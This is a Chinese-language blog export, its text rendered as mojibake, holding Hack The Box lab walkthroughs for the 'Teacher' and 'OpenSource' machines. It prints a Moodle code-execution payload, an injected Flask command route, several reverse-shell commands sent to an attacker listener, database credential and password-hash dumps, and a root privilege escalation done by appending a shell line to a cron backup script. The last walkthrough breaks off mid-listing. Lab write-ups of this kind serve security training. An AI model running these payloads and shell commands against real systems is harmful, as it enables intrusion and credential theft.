æ‰¾åˆ°äº†ä¸€ç¯‡æ¼æ´çš„å‚è€ƒæ–‡ç«  https://blog.sonarsource.com/moodle-remote-code-execution/?redirect=rips é¦–å…ˆï¼Œæˆ‘ä»¬å°†è¿›å…¥Algebraè¯¾ç¨‹ ç„¶åæ‰“å¼€ç¼–è¾‘ ç„¶åéšä¾¿é€‰ä¸€ä¸ªç‚¹å‡» Add an activity or resource è¿›è¡Œæ·»åŠ  ç„¶åé€‰æ‹© Quiz è¿™é‡Œéšä¾¿å¡«ï¼Œç„¶åsave and display æ¥ç€ edit quiz ç„¶å a new question æ–°å¢ä¸€ä¸ªæ–°é—®é¢˜ ç„¶åé€‰æ‹©calculated ä¸Šé¢éšä¾¿å¡«å†™ï¼Œanswer 1 formalu è¾“å…¥æˆ‘ä»¬çš„payloadï¼Œç„¶ågradeé€‰æ‹©100%å°±è¡Œ /*{a*/`$_GET[0]`;//{x}} ç„¶å save change http://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&amp;appendqnumstring=addquestion&amp;scrollpos=0&amp;id=6&amp;wizardnow=datasetitems&amp;cmid=7 ç‚¹å‡» next page è¿›å…¥é¡µé¢ï¼Œå¾—åˆ°äº†ä¸Šé¢çš„åœ°å€ ç„¶åä½¿ç”¨ nc å¼€å¯ä¸€ä¸ªç«¯å£ç›‘å¬ &amp;0=(nc -e /bin/bash 10.10.14.2 4444) æœ€åå°†æˆ‘ä»¬çš„ shell åå¼¹è¯­å¥æ·»åŠ åˆ°urlçš„æœ€åé¢ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.153] 56932 whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;; www-data@teacher:/var/www/html/moodle/question$ æˆåŠŸè·å–åˆ°ä¸€ä¸ª shell www-data@teacher:/var/www/html/moodle/question$ cd /home cd /home www-data@teacher:/home$ ls ls giovanni www-data@teacher:/home$ cd giovanni cd giovanni bash: cd: giovanni: Permission denied æˆ‘ä»¬æ²¡æœ‰æƒé™è®¿é—®ç”¨æˆ·ç›®å½• æƒé™æå‡Userè¿™è¾¹ç”¨çš„æ˜¯ moodle çš„ cmsï¼Œè€Œåœ¨ä¹‹å‰ fuzz çš„æ—¶å€™æœ‰çœ‹åˆ°ä¸€ä¸ª phpmyadminï¼Œæ‰€ä»¥æˆ‘çŒœæµ‹æ˜¯å’Œæ•°æ®åº“æœ‰å…³ã€‚ æ—¢ç„¶å’Œæ•°æ®åº“æœ‰å…³ï¼Œåˆæ˜¯ cmsï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½é…ç½®æ–‡ä»¶ä¸­æœ‰æ•°æ®çš„è´¦å·å¯†ç ï¼Œå»æ‰¾ä¸€ä¸‹ www-data@teacher:/var/www/html/moodle$ ls ls CONTRIBUTING.txt config-dist.php.bak message COPYING.txt config.php mnet Gruntfile.js config.php.save mod INSTALL.txt course my PULL_REQUEST_TEMPLATE.txt dataformat notes README.txt draftfile.php npm-shrinkwrap.json TRADEMARK.txt enrol package.json admin error phpunit.xml.dist analytics file.php pix auth files plagiarism availability filter pluginfile.php backup githash.php portfolio badges grade question behat.yml.dist group rating blocks help.php report blog help_ajax.php repository brokenfile.php index.php rss cache install search calendar install.php tag cohort iplookup theme comment lang user competency lib userpix completion local version.php composer.json login webservice composer.lock media www-data@teacher:/var/www/html/moodle$ cat config.php cat config.php &lt;?php // Moodle configuration file unset($CFG); global $CFG; $CFG = new stdClass(); $CFG-&gt;dbtype = &#39;mariadb&#39;; $CFG-&gt;dblibrary = &#39;native&#39;; $CFG-&gt;dbhost = &#39;localhost&#39;; $CFG-&gt;dbname = &#39;moodle&#39;; $CFG-&gt;dbuser = &#39;root&#39;; $CFG-&gt;dbpass = &#39;Welkom1!&#39;; $CFG-&gt;prefix = &#39;mdl_&#39;; $CFG-&gt;dboptions = array ( &#39;dbpersist&#39; =&gt; 0, &#39;dbport&#39; =&gt; 3306, &#39;dbsocket&#39; =&gt; &#39;&#39;, &#39;dbcollation&#39; =&gt; &#39;utf8mb4_unicode_ci&#39;, ); $CFG-&gt;wwwroot = &#39;http://teacher.htb/moodle&#39;; $CFG-&gt;dataroot = &#39;/var/www/moodledata&#39;; $CFG-&gt;admin = &#39;admin&#39;; $CFG-&gt;directorypermissions = 0777; require_once(__DIR__ . &#39;/lib/setup.php&#39;); // There is no php closing tag in this file, // it is intentional because it prevents trailing whitespace problems! åœ¨ &#x2F;var&#x2F;www&#x2F;html&#x2F;moodle&#x2F;config.php ä¸­ï¼Œæ‰¾åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç  $CFG-&gt;dbuser = &#39;root&#39;; $CFG-&gt;dbpass = &#39;Welkom1!&#39;; mysql -h 127.0.0.1 -u root -p Enter password: Welkom1! Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 499 Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1 Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [(none)]&gt; æˆåŠŸç™»å…¥ mysql MariaDB [(none)]&gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | moodle | | mysql | | performance_schema | | phpmyadmin | +--------------------+ 5 rows in set (0.00 sec) MariaDB [moodle]&gt; show tables; show tables; +----------------------------------+ | Tables_in_moodle | +----------------------------------+ | mdl_user | +----------------------------------+ 388 rows in set (0.00 sec) è¡¨æœ‰å¾ˆå¤šï¼Œæˆ‘å°±åˆ—ä¸€ä¸ªå¯¹æˆ‘ä»¬æ¥è¯´æœ‰ç”¨çš„äº† MariaDB [moodle]&gt; select * from mdl_user; select * from mdl_user; +------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+ | id | auth | confirmed | policyagreed | deleted | suspended | mnethostid | username | password | idnumber | firstname | lastname | email | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin | currentlogin | lastip | secret | picture | url | description | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename | +------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+ | 1 | manual | 1 | 0 | 0 | 0 | 1 | guest | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO | | Guest user | | root@localhost | 0 | | | | | | | | | | | | | en | gregorian | | 99 | 0 | 0 | 0 | 0 | | | 0 | | This user is a special user that allows read-only access to some courses. | 1 | 1 | 0 | 2 | 1 | 0 | 0 | 1530058999 | 0 | NULL | NULL | NULL | NULL | NULL | | 2 | manual | 1 | 0 | 0 | 0 | 1 | admin | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 | | Admin | User | gio@gio.nl | 0 | | | | | | | | | | | | | en | gregorian | | 99 | 1530059097 | 1530059573 | 1530059097 | 1530059307 | 192.168.206.1 | | 0 | | | 1 | 1 | 0 | 1 | 1 | 0 | 0 | 1530059135 | 0 | NULL | | | | | | 3 | manual | 1 | 0 | 0 | 0 | 1 | giovanni | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO | | Giovanni | Chhatta | Giio@gio.nl | 0 | | | | | | | | | | | | | en | gregorian | | 99 | 1530059681 | 1656564818 | 1656558129 | 1656558822 | 10.10.14.2 | | 0 | | | 1 | 1 | 0 | 2 | 1 | 0 | 1530059291 | 1530059291 | 0 | | | | | | | 1337 | manual | 0 | 0 | 0 | 0 | 0 | Giovannibak | 7a860966115182402ed06375cf0a22af | | | | | 0 | | | | | | | | | | | | | en | gregorian | | 99 | 0 | 0 | 0 | 0 | | | 0 | | NULL | 1 | 1 | 0 | 2 | 1 | 0 | 0 | 0 | 0 | NULL | NULL | NULL | NULL | NULL | +------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+ 4 rows in set (0.00 sec) æœ€ååªæœ‰ç¬¬å››ä¸ªç”¨æˆ·çš„ hash å¯ä»¥è§£å¯†å‡ºæ¥ï¼Œçœ‹åå­—æ˜¯ä¸ªå¤‡ä»½ï¼Œé‚£ç”¨æˆ·ååº”è¯¥å°±æ˜¯ giovanni äº† username = giovanni password = expelled è¿™å°±æ˜¯æˆ‘ä»¬åˆšæ‰æ²¡æœ‰æƒé™è®¿é—®çš„é‚£ä¸ªç”¨æˆ·ç›®å½•äº†ï¼Œå»åˆ‡æ¢åˆ°è¿™ä¸ªç”¨æˆ·è¯•è¯• www-data@teacher:/home$ su giovanni su giovanni Password: expelled giovanni@teacher:/home$ whoami&amp;&amp;id whoami&amp;&amp;id giovanni uid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni) æˆåŠŸææƒåˆ° user æƒé™ giovanni@teacher:/home$ cd giovanni cd giovanni giovanni@teacher:~$ ls ls user.txt work giovanni@teacher:~$ cat user.txt cat user.txt 9c991cf63230e31da617d2f1b8bb08d1 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ Rootgiovanni@teacher:/usr/bin$ cat backup.sh cat backup.sh #!/bin/bash cd /home/giovanni/work; tar -czvf tmp/backup_courses.tar.gz courses/*; cd tmp; tar -xf backup_courses.tar.gz; chmod 777 * -R; åœ¨ &#x2F;usr&#x2F;bin ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªåä¸º bakcup.sh çš„è„šæœ¬ giovanni@teacher:/usr/bin$ ls -la backup.sh ls -la backup.sh -rwxr-xr-x 1 root root 138 Jun 27 2018 backup.sh æƒé™æ˜¯ root ç”¨æˆ·çš„ï¼Œå’±ä»¬æœ‰æ‰§è¡Œæƒé™ï¼Œä½†æ˜¯æ²¡æœ‰å†™å…¥æƒé™ ä½†æ˜¯è¿™é‡Œè„šæœ¬ä¸­æœ‰ä¸ªé—®é¢˜ chmod 777 * -R; è¿™ä¸€å¥æ˜¯ä»£è¡¨è¿™ç»™æ‰€æœ‰ç”¨æˆ·èµ‹äºˆäº†æ‰€æœ‰æƒé™ï¼Œè¿™é‡Œå°±æ˜¯ææƒçš„å…³é”®ç‚¹äº† giovanni@teacher:~/work$ ln -s /root ./tmp ln -s /root ./tmp giovanni@teacher:~/work$ ls -la ls -la total 16 drwxr-xr-x 4 giovanni giovanni 4096 Mar 21 15:29 . drwxr-x--- 4 giovanni giovanni 4096 Apr 27 14:59 .. drwxr-xr-x 3 giovanni giovanni 4096 Mar 21 15:29 courses drwxr-xr-x 3 giovanni giovanni 4096 Jun 30 07:33 tmp é¦–å…ˆåˆ›å»ºä¸€ä¸ªè½¯è¿æ¥ï¼Œå°†è¿™ä¸ªè„šæœ¬æœ¬èº«ç»™èµ‹äºˆ 777 æƒé™ cd /home/giovanni/work/tmp/ rm -rf courses ln -s /usr/bin/ courses ç„¶åæˆ‘ä»¬å°±æœ‰æƒé™å¯¹ backup.sh è¿™ä¸ªè„šæœ¬è¿›è¡Œä¿®æ”¹äº† æ¥ç€ä½¿ç”¨ nc å†ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 5555 æ¥ç€å†™å…¥ä¸€ä¸ª nc åå¼¹è¯­å¥ echo &quot;nc -e /bin/bash 10.10.14.2 5555&quot; &gt;&gt; /usr/bin/backup.sh ç„¶åç­‰ç€ shell åå¼¹å›æ¥å°±å¥½äº† â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.153] 51910 whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸè·å¾— root æƒé™ cat /root/root.txt 05d8e3ee43c6af33f80069c615a88e4b æˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"OpenSource - Hackthebox","slug":"Hackthebox - OpenSource","date":"2022-06-07T11:38:36.000Z","updated":"2023-05-20T02:40:36.000Z","comments":true,"path":"2022/06/07/Hackthebox - OpenSource/","link":"","permalink":"http://www.lucifiel.com/2022/06/07/Hackthebox%20-%20OpenSource/","excerpt":"","text":"Hackthebox - OpenSourceé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.164 Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-06 14:49 CST Warning: 10.10.11.164 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.164 Host is up (0.18s latency). Not shown: 62504 closed ports, 3029 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA) | 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA) |_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.10.3 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Mon, 06 Jun 2022 06:56:05 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 5316 | Connection: close | &lt;html lang=&quot;en&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;UTF-8&quot;&gt; | &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; | &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt; | &lt;script src=&quot;/static/vendor/jquery/jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt; | &lt;script src=&quot;/static/vendor/popper/popper.min.js&quot;&gt;&lt;/script&gt; | &lt;script src=&quot;/static/vendor/bootstrap/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; | &lt;script src=&quot;/static/js/ie10-viewport-bug-workaround.js&quot;&gt;&lt;/script&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/vendor/bootstrap/css/bootstrap.css&quot;/&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot; /static/vendor/bootstrap/css/bootstrap-grid.css&quot;/&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot; /static/vendor/bootstrap/css/bootstrap-reboot.css&quot;/&gt; | &lt;link rel= | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.10.3 | Date: Mon, 06 Jun 2022 06:56:06 GMT | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, HEAD, GET | Content-Length: 0 | Connection: close | RTSPRequest: | &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; | &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt; | &lt;html&gt; | &lt;head&gt; | &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; | &lt;title&gt;Error response&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;h1&gt;Error response&lt;/h1&gt; | &lt;p&gt;Error code: 400&lt;/p&gt; | &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt; | &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt; | &lt;/body&gt; |_ &lt;/html&gt; |_http-server-header: Werkzeug/2.1.2 Python/3.10.3 |_http-title: upcloud - Upload files for Free! 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.91%I=7%D=6/6%Time=629DA3F6%P=x86_64-pc-linux-gnu%r(GetRe SF:quest,1573,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20Py SF:thon/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2006\\x20Jun\\x202022\\x2006:56:05\\x20GMT\\ SF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x205 SF:316\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;html\\x20lang=\\&quot;en\\&quot;&gt;\\n&lt;head&gt;\\n\\x20\\ SF:x20\\x20\\x20&lt;meta\\x20charset=\\&quot;UTF-8\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\ SF:&quot;viewport\\&quot;\\x20content=\\&quot;width=device-width,\\x20initial-scale=1\\.0\\&quot;&gt;\\n SF:\\x20\\x20\\x20\\x20&lt;title&gt;upcloud\\x20-\\x20Upload\\x20files\\x20for\\x20Free!&lt; SF:/title&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\&quot;/static/vendor/jquery/jquer SF:y-3\\.4\\.1\\.min\\.js\\&quot;&gt;&lt;/script&gt;\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\&quot;/stati SF:c/vendor/popper/popper\\.min\\.js\\&quot;&gt;&lt;/script&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;script\\ SF:x20src=\\&quot;/static/vendor/bootstrap/js/bootstrap\\.min\\.js\\&quot;&gt;&lt;/script&gt;\\n\\x SF:20\\x20\\x20\\x20&lt;script\\x20src=\\&quot;/static/js/ie10-viewport-bug-workaround\\ SF:.js\\&quot;&gt;&lt;/script&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href= SF:\\&quot;/static/vendor/bootstrap/css/bootstrap\\.css\\&quot;/&gt;\\n\\x20\\x20\\x20\\x20&lt;lin SF:k\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;\\x20/static/vendor/bootstrap/css/boot SF:strap-grid\\.css\\&quot;/&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20hre SF:f=\\&quot;\\x20/static/vendor/bootstrap/css/bootstrap-reboot\\.css\\&quot;/&gt;\\n\\n\\x20\\ SF:x20\\x20\\x20&lt;link\\x20rel=&quot;)%r(HTTPOptions,C7,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\n SF:Server:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2006\\x SF:20Jun\\x202022\\x2006:56:06\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20char SF:set=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20HEAD,\\x20GET\\r\\nContent-Length:\\x200 SF:\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(RTSPRequest,1F4,&quot;&lt;!DOCTYPE\\x20HTML SF:\\x20PUBLIC\\x20\\&quot;-//W3C//DTD\\x20HTML\\x204\\.01//EN\\&quot;\\n\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\&quot;http://www\\.w3\\.org/TR/html4/strict\\.dtd\\&quot;&gt;\\n&lt;html&gt;\\n\\x2 SF:0\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20http-equi SF:v=\\&quot;Content-Type\\&quot;\\x20content=\\&quot;text/html;charset=utf-8\\&quot;&gt;\\n\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20&lt;title&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\x20\\x20 SF:&lt;/head&gt;\\n\\x20\\x20\\x20\\x20&lt;body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;h1&gt;Er SF:ror\\x20response&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code: SF:\\x20400&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Bad\\x20requ SF:est\\x20version\\x20\\(&#39;RTSP/1\\.0&#39;\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20&lt;p&gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20-\\x20B SF:ad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.&lt;/p&gt;\\n\\x20\\x20\\ SF:x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/6%OT=22%CT=1%CU=35351%PV=Y%DS=2%DC=T%G=Y%TM=629DA462 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 199/tcp) HOP RTT ADDRESS 1 176.47 ms 10.10.14.1 2 177.14 ms 10.10.11.164 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 249.84 seconds Http ä¼¼ä¹æ˜¯ä¸€ä¸ªä»€ä¹ˆäº‘å¹³å°ï¼Œæ ¹æ® Nmap æ‰«æåˆ°çš„ç»“æœ Werkzeug&#x2F;2.1.2 è¿›è¡Œæœç´¢ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªè·¯å¾„ &#x2F;console ä½†æ˜¯æµ‹è¯•äº†ä¸€ä¸‹ï¼Œç½‘ç»œä¸Šæåˆ°çš„ä»¥åŠ MSF å†…çš„ exp éƒ½æ²¡æœ‰æˆåŠŸ ä¸»é¡µæœ‰ä¸€ä¸ªæ–‡ä»¶å¯ä»¥ä¸‹è½½ï¼Œä¸‹è½½åè¿›è¡Œè§£å‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/source/app/app] â””â”€# cat views.py import os from app.utils import get_file_name from flask import render_template, request, send_file from app import app @app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def upload_file(): if request.method == &#39;POST&#39;: f = request.files[&#39;file&#39;] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, file_name) f.save(file_path) return render_template(&#39;success.html&#39;, file_url=request.host_url + &quot;uploads/&quot; + file_name) return render_template(&#39;upload.html&#39;) @app.route(&#39;/uploads/&lt;path:path&gt;&#39;) def send_report(path): path = get_file_name(path) return send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path)) åœ¨ &#x2F;source&#x2F;app&#x2F;app&#x2F;views.py ä¸­çœ‹åˆ°ç‚¹æœ‰è¶£çš„å†…å®¹ï¼Œhttp://10.10.11.164/upcloud ç„¶åè¿™è¾¹è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹ã€‚ é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥ä¼ªé€  views.py çš„å†…å®¹ï¼Œç„¶åä¼ ä¸Šå»è·å¾—åˆ©ç”¨å‘¢ï¼Ÿ æ¼æ´åˆ©ç”¨@app.route(&#39;/exec&#39;) def cmd(): return os.system(request.args.get(&#39;cmd&#39;)) åœ¨ views.py çš„æœ€ååŠ ä¸Šè¿™ä¹ˆä¸€å¥ï¼Œç„¶åå»ä¸Šä¼ ï¼Œä½¿ç”¨ burp è¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åæŠŠæˆ‘ä»¬ä¿®æ”¹çš„å†…å®¹åŠ è¿›å» ä¼ ä¸Šå»åæŸ¥çœ‹ä¸€ä¸‹ ç¡®å®šæ˜¯å·²ç»ä¼ ä¸Šå»äº† ä½†æ˜¯æ— æ³•è®¿é—®å’Œæ‰§è¡Œï¼Œæˆ‘ä»¬å»ä¿®æ”¹ä¸€ä¸‹è·¯å¾„è¯•è¯• ä¼¼ä¹æ˜¯è¢« WAF ç»™æ‹¦æˆªäº†ï¼Œå°è¯•ç»•è¿‡ä¸€ä¸‹ ç„¶åå°±æˆåŠŸäº†ï¼Œå»è®¿é—®ä¸€ä¸‹å§ ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ ç„¶åè®¿é—®æˆ‘ä»¬çš„ webshell http://10.10.11.164/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.33%204444%20%3E%2Ftmp%2Ff å°±å¾—åˆ°äº†ä¸€ä¸ª shell â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.33] from (UNKNOWN) [10.10.11.164] 41083 /bin/sh: can&#39;t access tty; job control turned off /app # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) /app # ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:03 inet addr:172.17.0.3 Bcast:172.17.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8217 errors:0 dropped:0 overruns:0 frame:0 TX packets:4351 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:595585 (581.6 KiB) TX bytes:1844757 (1.7 MiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) çœ‹ç€ä¸å¤ªå¯¹ï¼Œæ„Ÿè§‰åƒæ˜¯åœ¨ docker é‡Œ /home # ls -la / total 72 drwxr-xr-x 1 root root 4096 Jun 6 08:06 . drwxr-xr-x 1 root root 4096 Jun 6 08:06 .. -rwxr-xr-x 1 root root 0 Jun 6 08:06 .dockerenv drwxr-xr-x 1 root root 4096 May 4 16:35 app drwxr-xr-x 1 root root 4096 Mar 17 05:52 bin drwxr-xr-x 5 root root 340 Jun 6 08:06 dev drwxr-xr-x 1 root root 4096 Jun 6 08:06 etc drwxr-xr-x 2 root root 4096 May 4 16:35 home drwxr-xr-x 1 root root 4096 May 4 16:35 lib drwxr-xr-x 5 root root 4096 May 4 16:35 media drwxr-xr-x 2 root root 4096 May 4 16:35 mnt drwxr-xr-x 2 root root 4096 May 4 16:35 opt dr-xr-xr-x 233 root root 0 Jun 6 08:06 proc drwx------ 1 root root 4096 May 4 16:35 root drwxr-xr-x 1 root root 4096 Jun 6 08:06 run drwxr-xr-x 1 root root 4096 Mar 17 05:52 sbin drwxr-xr-x 2 root root 4096 May 4 16:35 srv dr-xr-xr-x 13 root root 0 Jun 6 08:06 sys drwxrwxrwt 1 root root 4096 Jun 6 13:33 tmp drwxr-xr-x 1 root root 4096 